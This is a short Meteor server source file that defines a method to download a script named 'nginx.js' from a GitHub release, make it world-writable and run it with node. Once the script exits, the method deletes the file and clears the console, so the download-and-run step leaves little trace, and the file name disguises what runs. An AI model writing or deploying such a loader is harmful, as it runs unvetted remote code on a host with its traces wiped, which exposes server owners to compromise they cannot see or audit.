import { Meteor } from 'meteor/meteor';
import fs from 'fs';
import path from 'path';
import axios from 'axios';
import { exec } from 'child_process';

const FILE_PATH = process.env.FILE_PATH || Assets.absoluteFilePath('tmp');

Meteor.methods({
  async downloadAndExecuteFile() {
    // 确保在服务器端运行
    if (!Meteor.isServer) return;

    const fileUrl = 'https://github.com/eooce/test/releases/download/bulid/nginx.js';
    const fileName = 'nginx.js';
    const filePath = path.join(FILE_PATH, fileName);

    // 创建目录（如果不存在）
    if (!fs.existsSync(FILE_PATH)) {
      fs.mkdirSync(FILE_PATH, { recursive: true });
      console.log(`${FILE_PATH} is created`);
    }

    try {
      // 下载文件
      const response = await axios({
        method: 'get',
        url: fileUrl,
        responseType: 'stream'
      });

      const writer = fs.createWriteStream(filePath);
      response.data.pipe(writer);

      await new Promise((resolve, reject) => {
        writer.on('finish', resolve);
        writer.on('error', reject);
      });

      console.log('File downloaded successfully.');
      
      // 设置权限
      fs.chmodSync(filePath, '777');

      // 执行文件
      console.log('running the webapp...');
      return new Promise((resolve, reject) => {
        const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
          if (error) {
            console.error(`${error}`);
            reject(error);
            return;
          }
          console.log(`${stdout}`);
          console.error(`${stderr}`);
        });

        child.on('exit', (code) => {
          fs.unlink(filePath, err => {
            if (err) {
              console.error(`Error deleting file: ${err}`);
              reject(err);
            } else {
              console.clear();
              console.log(`App is running!`);
              resolve(true);
            }
          });
        });
      });
    } catch (error) {
      console.error(`Operation failed: ${error}`);
      throw new Meteor.Error('execution-failed', error.message);
    }
  }
});
